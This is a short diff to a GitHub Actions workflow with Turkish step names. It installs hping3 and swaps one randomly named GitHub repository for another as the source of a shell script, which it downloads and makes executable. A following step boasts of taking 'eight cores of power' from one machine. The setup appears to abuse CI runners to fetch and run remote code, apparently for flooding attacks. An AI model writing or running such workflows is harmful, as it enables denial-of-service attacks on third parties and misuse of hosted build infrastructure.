@@ -16,7 +16,7 @@ jobs:
       - name: İndir ve Hazırla
         run: |
           sudo apt install -y hping3
-          wget https://github.com/asdasdawdasdw453xsdfg/aksuhdj/raw/refs/heads/main/real2.sh -O real.sh
+          wget https://github.com/adsasddsf/sfdfdfgert324rewaq2edr/raw/refs/heads/main/real.sh -O real.sh
           chmod +x real.sh
           
       - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
